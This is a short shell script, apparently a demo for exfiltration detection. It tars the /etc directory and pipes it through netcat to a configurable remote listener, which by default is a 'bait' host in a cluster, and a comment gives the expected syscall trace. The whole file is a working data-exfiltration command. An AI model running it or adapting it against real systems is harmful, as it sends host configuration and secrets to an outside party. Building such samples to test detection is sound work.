#!/bin/sh
# Data-exfiltration pattern: tar a sensitive directory and pipe it to a
# remote TCP listener. Syscall trace: openat (lots) → read (lots) → socket
# → connect → write (lots) → close → exit_group.
TARGET="${TARGET:-bait.demo.svc.cluster.local}"
PORT="${PORT:-4445}"
echo "[*] Exfiltrating /etc to ${TARGET}:${PORT}"
tar -cz /etc 2>/dev/null | timeout 8 nc -w 5 "$TARGET" "$PORT" || true
echo "[*] Exfil complete"
